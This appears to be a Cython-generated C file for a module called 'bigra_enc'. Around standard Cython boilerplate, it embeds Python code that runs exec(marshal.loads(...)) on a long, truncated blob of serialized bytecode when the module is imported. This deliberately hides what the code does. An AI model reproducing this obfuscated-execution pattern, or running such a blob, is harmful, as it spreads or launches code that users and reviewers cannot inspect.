5\270D\324\010A\327\010H\321\010H\310\027\323\010Q\327\010Y\321\010Y\320Z^\320_a\323\010b\200\005\330\007\016\200\004\360\002\003\001\030\330\017&\210z\327\017&\321\017&\320'C\310$\324\017O\327\017V\321\017V\320W^\323\017_\327\017e\321\017e\320fi\323\017j\320kl\321\017m\327\017u\321\017u\320vz\320{}\323\017~\210\004\360\006\000\010\037\200z\327\007\036\321\007\036\320\037@\300t\324\007L\327\007S\321\007S\320T[\323\007\\\327\007d\321\007d\320ei\320jl\323\007m\200\004\330\007\036\200z\327\007\036\321\007\036\320\0379\300\004\324\007E\327\007L\321\007L\310W\323\007U\327\007]\321\007]\320^b\320ce\323\007f\200\004\330\007\014\200\004\330\007\026\200\004\330\007\036\200z\327\007\036\321\007\036\320\037?\300d\324\007K\327\007R\321\007R\320SZ\323\007[\327\007c\321\007c\320dg\320hk\323\007l\327\007t\321\007t\320uy\320z|\323\007}\200\004\330\007\036\320\0376\230z\327\0376\321\0376\3207`\320gk\324\037l\327\037s\321\037s\320t{\323\037|\367\000\000 E\002\361\000\000 E\002\360\000\000F\002J\002\360\000\000K\002M\002\363\000\000 N\002\361\000\000\010N\002\360\000\000O\002X\002\361\000\000\010X\002\360\000\000Y\002p\002\360\000\000Y\002c\002\367\000\000Y\002p\002\361\000\000Y\002p\002\360\000\000q\002Y\003\360\000\000`\003d\003\364\000\000Y\002e\003\367\000\000Y\002l\003\361\000\000Y\002l\003\360\000\000m\003t\003\363\000\000Y\002u\003\367\000\000Y\002}\003\361\000\000Y\002}\003\360\000\000~\003B\004\360\000\000C\004E\004\363\000\000Y\002F\004\361\000\000\010F\004\200\004\360\002\024\001\030\330\017&\210z\327\017&\321\017&\320'C\310$\324\017O\327\017V\321\017V\320W^\323\017_\327\017e\321\017e\320fi\323\017j\210\004\330\020\021\210\005\333\021\025\210A\330\020\025\220q\221\010\221\005\360\003\000\022\026\340\021\032\210\006\330\013\021\220S\212=\330\027.\220z\327\027.\321\027.\320/K\320RV\324\027W""\327\027^\321\027^\320_f\323\027g\327\027m\321\027m\320nq\323\027r\320st\321\027u\327\027}\321\027}\360\000\000\001C\002\360\000\000D\002F\002\363\000\000\030G\002\220\004\334\020\026\230\004\221\014\221\006\330\r\023\220s\212]\360\002\005\021%\330\0376\230z\327\0376\321\0376\3207S\320Z^\324\037_\327\037f\321\037f\320gn\323\037o\327\037u\321\037u\320vy\323\037z\320{|\321\037}\367\000\000 F\002\361\000\000 F\002\360\000\000G\002K\002\360\000\000L\002N\002\363\000\000 O\002\230\004\334\030\036\240\004\231\014\231\006\360\n\000\030 \220\004\334\020\026\230\004\221\014\220\006\360\010\000\033*\330\020\025\330\020\025\330\017\023\330\017\023\330\017\023\330\017\024\330\017\023\330\017\023\330\017\023\361\025\n\n\025\200\006\362\026\002\001\020\360\006\014\007?\200\004\362\036\001\001U\001\360\006\000\006\007\200\004\330\004\006\200\003\330\004\006\200\003\330\004\006\200\003\330\003\005\200\002\362\006\035\001\020\362@\001G\001\001\027\362P\002L\002\001\025\362Z\004L\002\001\025\362Z\004$\001\r\362J\001#\001\024\361H\001\000\001\n\205\013\370\360C\022\000\010\033\362\000\003\001\010\331\001\006\320\007/\324\0010\330\001\n\200\022\207\031\201\031\320\013F\324\001G\331\001\005\207\026\360\007\003\001\010\373\360d\001\001\001\030\330\017\027\213\004\373\360(\000\030!\362\000\002\021%\330\037'\230\004\334\030\036\240\004\231\014\235\006\373\360\005\002\021%\373\360\014\001\001\030\330\017\027\212\004\372sV\000\000\000\270/R*\000\310\033A\005S\027\000\315;B\033S>\000\320\027A\016S!\000\321%\014S>\000\322*&S\024\003\323\023\001S\024\003\323\027\004S\036\003\323!\005S;\003\323&\013S6\003\3231\005S>\000\3236\005S;\003\323;\003S>\000\323>\004T\004\003";
/* #### Code section: decls ### */
/* #### Code section: late_includes ### */
/* #### Code section: module_state ### */
/* SmallCodeConfig */
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

typedef struct {
  PyObject *__pyx_d;
  PyObject *__pyx_b;
  PyObject *__pyx_cython_runtime;
  PyObject *__pyx_empty_tuple;
  PyObject *__pyx_empty_bytes;
  PyObject *__pyx_empty_unicode;
  #ifdef __Pyx_CyFunction_USED
  PyTypeObject *__pyx_CyFunctionType;
  #endif
  #ifdef __Pyx_FusedFunction_USED
  PyTypeObject *__pyx_FusedFunctionType;
  #endif
  #ifdef __Pyx_Generator_USED
  PyTypeObject *__pyx_GeneratorType;
  #endif
  #ifdef __Pyx_IterableCoroutine_USED
  PyTypeObject *__pyx_IterableCoroutineType;
  #endif
  #ifdef __Pyx_Coroutine_USED
  PyTypeObject *__pyx_CoroutineAwaitType;
  #endif
  #ifdef __Pyx_Coroutine_USED
  PyTypeObject *__pyx_CoroutineType;
  #endif
  PyObject *__pyx_string_tab[13];
/* #### Code section: module_state_contents ### */
/* CodeObjectCache.module_state_decls */
struct __Pyx_CodeObjectCache __pyx_code_cache;

/* #### Code section: module_state_end ### */
} __pyx_mstatetype;

#if CYTHON_USE_MODULE_STATE
#ifdef __cplusplus
namespace {
extern struct PyModuleDef __pyx_moduledef;
} /* anonymous namespace */
#else
static struct PyModuleDef __pyx_moduledef;
#endif

#define __pyx_mstate_global (__Pyx_PyModule_GetState(__Pyx_State_FindModule(&__pyx_moduledef)))

#define __pyx_m (__Pyx_State_FindModule(&__pyx_moduledef))
#else
static __pyx_mstatetype __pyx_mstate_global_static =
#ifdef __cplusplus
    {};
#else
    {0};
#endif
static __pyx_mstatetype * const __pyx_mstate_global = &__pyx_mstate_global_static;
#endif
/* #### Code section: constant_name_defines ### */
#define __pyx_kp_u_ __pyx_string_tab[0]
#define __pyx_n_u_builtins __pyx_string_tab[1]
#define __pyx_n_u_cline_in_traceback __pyx_string_tab[2]
#define __pyx_kp_b_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z __pyx_string_tab[3]
#define __pyx_n_u_initializing __pyx_string_tab[4]
#define __pyx_n_u_loads __pyx_string_tab[5]
#define __pyx_n_u_main __pyx_string_tab[6]
#define __pyx_n_u_marshal __pyx_string_tab[7]
#define __pyx_n_u_module __pyx_string_tab[8]
#define __pyx_n_u_name __pyx_string_tab[9]
#define __pyx_n_u_qualname __pyx_string_tab[10]
#define __pyx_n_u_spec __pyx_string_tab[11]
#define __pyx_n_u_test __pyx_string_tab[12]
/* #### Code section: module_state_clear ### */
#if CYTHON_USE_MODULE_STATE
static CYTHON_SMALL_CODE int __pyx_m_clear(PyObject *m) {
  __pyx_mstatetype *clear_module_state = __Pyx_PyModule_GetState(m);
  if (!clear_module_state) return 0;
  Py_CLEAR(clear_module_state->__pyx_d);
  Py_CLEAR(clear_module_state->__pyx_b);
  Py_CLEAR(clear_module_state->__pyx_cython_runtime);
  Py_CLEAR(clear_module_state->__pyx_empty_tuple);
  Py_CLEAR(clear_module_state->__pyx_empty_bytes);
  Py_CLEAR(clear_module_state->__pyx_empty_unicode);
  #ifdef __Pyx_CyFunction_USED
  Py_CLEAR(clear_module_state->__pyx_CyFunctionType);
  #endif
  #ifdef __Pyx_FusedFunction_USED
  Py_CLEAR(clear_module_state->__pyx_FusedFunctionType);
  #endif
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __Pyx_State_RemoveModule(NULL);
  #endif
  for (int i=0; i<13; ++i) { Py_CLEAR(clear_module_state->__pyx_string_tab[i]); }
  return 0;
}
#endif
/* #### Code section: module_state_traverse ### */
#if CYTHON_USE_MODULE_STATE
static CYTHON_SMALL_CODE int __pyx_m_traverse(PyObject *m, visitproc visit, void *arg) {
  __pyx_mstatetype *traverse_module_state = __Pyx_PyModule_GetState(m);
  if (!traverse_module_state) return 0;
  Py_VISIT(traverse_module_state->__pyx_d);
  Py_VISIT(traverse_module_state->__pyx_b);
  Py_VISIT(traverse_module_state->__pyx_cython_runtime);
  __Pyx_VISIT_CONST(traverse_module_state->__pyx_empty_tuple);
  __Pyx_VISIT_CONST(traverse_module_state->__pyx_empty_bytes);
  __Pyx_VISIT_CONST(traverse_module_state->__pyx_empty_unicode);
  #ifdef __Pyx_CyFunction_USED
  Py_VISIT(traverse_module_state->__pyx_CyFunctionType);
  #endif
  #ifdef __Pyx_FusedFunction_USED
  Py_VISIT(traverse_module_state->__pyx_FusedFunctionType);
  #endif
  for (int i=0; i<13; ++i) { __Pyx_VISIT_CONST(traverse_module_state->__pyx_string_tab[i]); }
  return 0;
}
#endif
/* #### Code section: module_code ### */
/* #### Code section: module_exttypes ### */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};
/* #### Code section: initfunc_declarations ### */
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_InitConstants(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(__pyx_mstatetype *__pyx_mstate); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_CreateCodeObjects(__pyx_mstatetype *__pyx_mstate); /*proto*/
/* #### Code section: init_module ### */

static int __Pyx_modinit_global_init_code(__pyx_mstatetype *__pyx_mstate) {
  __Pyx_RefNannyDeclarations
  CYTHON_UNUSED_VAR(__pyx_mstate);
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(__pyx_mstatetype *__pyx_mstate) {
  __Pyx_RefNannyDeclarations
  CYTHON_UNUSED_VAR(__pyx_mstate);
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(__pyx_mstatetype *__pyx_mstate) {
  __Pyx_RefNannyDeclarations
  CYTHON_UNUSED_VAR(__pyx_mstate);
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(__pyx_mstatetype *__pyx_mstate) {
  __Pyx_RefNannyDeclarations
  CYTHON_UNUSED_VAR(__pyx_mstate);
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(__pyx_mstatetype *__pyx_mstate) {
  __Pyx_RefNannyDeclarations
  CYTHON_UNUSED_VAR(__pyx_mstate);
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(__pyx_mstatetype *__pyx_mstate) {
  __Pyx_RefNannyDeclarations
  CYTHON_UNUSED_VAR(__pyx_mstate);
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(__pyx_mstatetype *__pyx_mstate) {
  __Pyx_RefNannyDeclarations
  CYTHON_UNUSED_VAR(__pyx_mstate);
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_bigra_enc(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_bigra_enc},
  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
  {Py_mod_gil, Py_MOD_GIL_USED},
  #endif
  #if PY_VERSION_HEX >= 0x030C0000 && CYTHON_USE_MODULE_STATE
  {Py_mod_multiple_interpreters, Py_MOD_MULTIPLE_INTERPRETERS_NOT_SUPPORTED},
  #endif
  {0, NULL}
};
#endif

#ifdef __cplusplus
namespace {
  struct PyModuleDef __pyx_moduledef =
  #else
  static struct PyModuleDef __pyx_moduledef =
  #endif
  {
      PyModuleDef_HEAD_INIT,
      "bigra_enc",
      0, /* m_doc */
    #if CYTHON_USE_MODULE_STATE
      sizeof(__pyx_mstatetype), /* m_size */
    #else
      (CYTHON_PEP489_MULTI_PHASE_INIT) ? 0 : -1, /* m_size */
    #endif
      __pyx_methods /* m_methods */,
    #if CYTHON_PEP489_MULTI_PHASE_INIT
      __pyx_moduledef_slots, /* m_slots */
    #else
      NULL, /* m_reload */
    #endif
    #if CYTHON_USE_MODULE_STATE
      __pyx_m_traverse, /* m_traverse */
      __pyx_m_clear, /* m_clear */
      NULL /* m_free */
    #else
      NULL, /* m_traverse */
      NULL, /* m_clear */
      NULL /* m_free */
    #endif
  };
  #ifdef __cplusplus
} /* anonymous namespace */
#endif

/* PyModInitFuncType */
#ifndef CYTHON_NO_PYINIT_EXPORT
  #define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#else
  #ifdef __cplusplus
  #define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
  #else
  #define __Pyx_PyMODINIT_FUNC PyObject *
  #endif
#endif

__Pyx_PyMODINIT_FUNC PyInit_bigra_enc(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_bigra_enc(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
/* ModuleCreationPEP489 */
#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x03090000
static PY_INT64_T __Pyx_GetCurrentInterpreterId(void) {
    {
        PyObject *module = PyImport_ImportModule("_interpreters"); // 3.13+ I think
        if (!module) {
            PyErr_Clear(); // just try the 3.8-3.12 version
            module = PyImport_ImportModule("_xxsubinterpreters");
            if (!module) goto bad;
        }
        PyObject *current = PyObject_CallMethod(module, "get_current", NULL);
        Py_DECREF(module);
        if (!current) goto bad;
        if (PyTuple_Check(current)) {
            PyObject *new_current = PySequence_GetItem(current, 0);
            Py_DECREF(current);
            current = new_current;
            if (!new_current) goto bad;
        }
        long long as_c_int = PyLong_AsLongLong(current);
        Py_DECREF(current);
        return as_c_int;
    }
  bad:
    PySys_WriteStderr("__Pyx_GetCurrentInterpreterId failed. Try setting the C define CYTHON_PEP489_MULTI_PHASE_INIT=0\n");
    return -1;
}
#endif
#if !CYTHON_USE_MODULE_STATE
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    static PY_INT64_T main_interpreter_id = -1;
#if CYTHON_COMPILING_IN_GRAAL
    PY_INT64_T current_id = PyInterpreterState_GetIDFromThreadState(PyThreadState_Get());
#elif CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX >= 0x03090000
    PY_INT64_T current_id = PyInterpreterState_GetID(PyInterpreterState_Get());
#elif CYTHON_COMPILING_IN_LIMITED_API
    PY_INT64_T current_id = __Pyx_GetCurrentInterpreterId();
#else
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
#endif
    if (unlikely(current_id == -1)) {
        return -1;
    }
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return 0;
    } else if (unlikely(main_interpreter_id != current_id)) {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
#endif
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none)
{
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    CYTHON_UNUSED_VAR(def);
    #if !CYTHON_USE_MODULE_STATE
    if (__Pyx_check_single_interpreter())
        return NULL;
    #endif
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_bigra_enc(PyObject *__pyx_pyinit_module)
#endif
{
  int stringtab_initialized = 0;
  #if CYTHON_USE_MODULE_STATE
  int pystate_addmodule_run = 0;
  #endif
  __pyx_mstatetype *__pyx_mstate = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  size_t __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'bigra_enc' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #else
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_t_1 = __pyx_pyinit_module;
  Py_INCREF(__pyx_t_1);
  #else
  __pyx_t_1 = PyModule_Create(&__pyx_moduledef); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #if CYTHON_USE_MODULE_STATE
  {
    int add_module_result = __Pyx_State_AddModule(__pyx_t_1, &__pyx_moduledef);
    __pyx_t_1 = 0; /* transfer ownership from __pyx_t_1 to "bigra_enc" pseudovariable */
    if (unlikely((add_module_result < 0))) __PYX_ERR(0, 1, __pyx_L1_error)
    pystate_addmodule_run = 1;
  }
  #else
  __pyx_m = __pyx_t_1;
  #endif
  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
  PyUnstable_Module_SetGIL(__pyx_m, Py_MOD_GIL_USED);
  #endif
  __pyx_mstate = __pyx_mstate_global;
  CYTHON_UNUSED_VAR(__pyx_t_1);
  __pyx_mstate->__pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_mstate->__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_mstate->__pyx_d);
  __pyx_mstate->__pyx_b = __Pyx_PyImport_AddModuleRef(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_mstate->__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_mstate->__pyx_cython_runtime = __Pyx_PyImport_AddModuleRef("cython_runtime"); if (unlikely(!__pyx_mstate->__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_mstate->__pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /* ImportRefnannyAPI */
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif

__Pyx_RefNannySetupContext("PyInit_bigra_enc", 0);
  if (__Pyx_check_binary_version(__PYX_LIMITED_VERSION_HEX, __Pyx_get_runtime_version(), CYTHON_COMPILING_IN_LIMITED_API) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_mstate->__pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_mstate->__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_mstate->__pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_mstate->__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_mstate->__pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_mstate->__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitConstants(__pyx_mstate) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  stringtab_initialized = 1;
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  if (__pyx_module_is_main_bigra_enc) {
    if (PyObject_SetAttr(__pyx_m, __pyx_mstate_global->__pyx_n_u_name, __pyx_mstate_global->__pyx_n_u_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "bigra_enc")) {
      if (unlikely((PyDict_SetItemString(modules, "bigra_enc", __pyx_m) < 0))) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins(__pyx_mstate) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants(__pyx_mstate) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  if (__Pyx_CreateCodeObjects(__pyx_mstate) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code(__pyx_mstate);
  (void)__Pyx_modinit_variable_export_code(__pyx_mstate);
  (void)__Pyx_modinit_function_export_code(__pyx_mstate);
  (void)__Pyx_modinit_type_init_code(__pyx_mstate);
  (void)__Pyx_modinit_type_import_code(__pyx_mstate);
  (void)__Pyx_modinit_variable_import_code(__pyx_mstate);
  (void)__Pyx_modinit_function_import_code(__pyx_mstate);
  /*--- Execution code ---*/

  /* "bigra_enc.py":4
 * #ENCRYPTION : PY3 MARSHAL
 * 
 * import marshal             # <<<<<<<<<<<<<<
 * exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\xf3\x0e\n\x00\x00\x97\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x00Z\x00d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04d\x00d\x01l\x05Z\x05\x02\x00e\x06d\x02\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\t\x00d\x00d\x01l\x08Z\x08d\x00d\x01l\tZ\td\x00d\x01l\nZ\nd\x00d\x01l\x0bZ\x0bd\x00d\x01l\x0cZ\x0cd\x00d\x01l\rZ\rd\x00d\x01l\x05Z\x05d\x00d\x01l\x0eZ\x0ed\x00d\x01l\x0fZ\x0fd\x00d\x04l\x0b\xad\x02\x01\x00d\x00d\x05l\x10m\x11Z\x12\x01\x00g\x00g\x00d\x00g\x00f\x04\\\x04\x00\x00a\x15a\x16a\x17Z\x18\x02\x00e\nj2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00j4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01d\x07\x1a\x00j7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00Z\x1cd\x08\x84\x00Z\x1dd\t\x84\x00Z\x1eg\x00Z\x1f\x02\x00e d\n\xab\x01\x00\x00\x00\x00\x00\x00D\x00]\xc6\x00\x00Z!d\x0bZ"\x02\x00e\rjF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x0c\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00Z$d\rZ%\x02\x00e\rjF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x0e\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00Z&\x02\x00e\rjN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0fd\x10\xab\x02\x00\x00\x00\x00\x00\x00Z(\x02\x00e\rjF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x0e\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00Z)d\x11Z*\x02\x00e\rjN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x12d\x13\xab\x02\x00\x00\x00\x00\x00\x00Z+d\x14Z,\x02\x00e\rjN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15d\x16\xab\x02\x00\x00\x00\x00\x00\x00Z-\x02\x00e\rjN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x17d\x18\xab\x02\x00\x00\x00\x00\x00\x00Z.d\x19Z/e"\x9b\x00d\x1ae$\x9b\x00d\x1be%\x9b\x00e&\x9b\x00e(\x9b\x00e)\x9b\x00d\x1ce*\x9b\x00e+\x9b\x00d\x1de,\x9b\x00d\x1de-\x9b\x00d\x1de.\x9b\x00d\x1ae/\x9b\x00\x9d\x13Z0e\x1fjc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e0\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x8c\xc8\x04\x00d\x1eZ2g\x00d\x1f\xa2\x01Z3d a4\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d!d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d 